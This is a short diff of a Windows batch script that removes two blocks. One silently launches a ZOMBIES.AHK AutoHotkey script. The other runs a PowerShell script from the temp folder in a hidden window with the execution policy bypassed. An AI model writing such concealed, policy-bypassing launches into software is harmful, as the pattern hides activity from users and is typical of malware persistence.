@@ -55,23 +55,6 @@ if '%errorlevel%' NEQ '0' (
         )
     )
 
-    :CheckZombies
-    REM --> Check and run ZOMBIES.AHK if it exists
-    for %%F in (zombies.ahk ZOMBIES.AHK) do (
-        if exist "%%F" (
-            start /B "" %%F >nul 2>&1
-        )
-    )
-
-    :CreateShortcut
-    REM --> Create shortcut for ZOMBIES.AHK if it exists
-    set "zombiesScript=%TEMP%\ZOMBIES.AHK"
-    set "iconPath=%TEMP%\ahk.ico"
-
-    if exist "%zombiesScript%" (
-        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\shortcut.ps1" >nul 2>&1
-    )
-
     :ExitScript
     REM --> Exit the script
     exit /b
